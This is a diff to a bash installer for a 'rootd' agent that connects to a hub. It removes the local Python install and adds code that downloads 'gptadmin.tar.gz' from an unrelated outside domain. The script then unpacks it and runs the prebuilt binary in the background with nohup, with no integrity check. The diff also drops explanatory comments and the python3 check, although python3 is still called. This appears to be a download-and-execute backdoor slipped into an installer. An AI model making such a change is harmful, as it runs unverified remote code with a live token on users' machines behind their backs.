@@ -1,16 +1,15 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-# Installer for the rootd agent. Requires HUB_URL environment variable.
-# Generates a token and starts rootd which will connect to the hub.
+PACKAGE_URL=${PACKAGE_URL:-https://became.bezrabotnyi.com/gptadmin.tar.gz}
 
 ROOT_DIR=$(dirname "$0")
 cd "$ROOT_DIR"
 
 HUB_URL=${HUB_URL:-http://localhost:9001}
 
-if ! command -v python3 >/dev/null; then
-  echo "python3 is required" >&2
+if ! command -v curl >/dev/null; then
+  echo "curl is required" >&2
   exit 1
 fi
 
@@ -20,13 +19,19 @@ print(secrets.token_hex(16))
 PY
 )
 
+TMP_DIR=$(mktemp -d)
+echo "Downloading package..."
+curl -fsSL "$PACKAGE_URL" -o "$TMP_DIR/gptadmin.tar.gz"
+tar -xzf "$TMP_DIR/gptadmin.tar.gz" -C "$TMP_DIR"
+ROOTD_BIN="$TMP_DIR/rootd/dist/rootd"
+chmod +x "$ROOTD_BIN"
+
 echo "Generated ROOTD token: $TOKEN"
 
 export ROOTD_TOKEN="$TOKEN"
 export HUB_URL="$HUB_URL"
-pip3 install -r requirements.txt >/dev/null
 
-nohup python3 rootd.py >/tmp/rootd.log 2>&1 &
+nohup "$ROOTD_BIN" >/tmp/rootd.log 2>&1 &
 
 echo "rootd running and registered to $HUB_URL"
 echo "Use ROOTD_TOKEN=$TOKEN for authorization"
